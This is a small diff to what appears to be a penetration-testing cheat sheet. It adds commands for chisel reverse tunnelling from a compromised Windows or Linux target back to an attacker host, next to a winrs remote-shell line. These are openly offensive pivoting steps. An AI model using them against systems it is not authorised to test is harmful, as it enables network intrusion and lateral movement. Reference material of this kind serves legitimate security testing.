@@ -635,13 +635,21 @@ winrs -R:<host> -u:<username> -p:<password> cmd
 attacker
 
 ```shell
-./chisel server -p <port> --reverse
+./chisel server -p <port> --reverse -v
 ```
 
 target
 
+Windows
+
 ```powershell
 .\chisel.exe client <attacker ip>:<attacker port> R:socks
+```
+
+Linux
+
+```shell
+./chisel client <attacker ip>:<attacker port> R:<target service port>:localhost:<target service port>
 ```
 
 using proxychains 
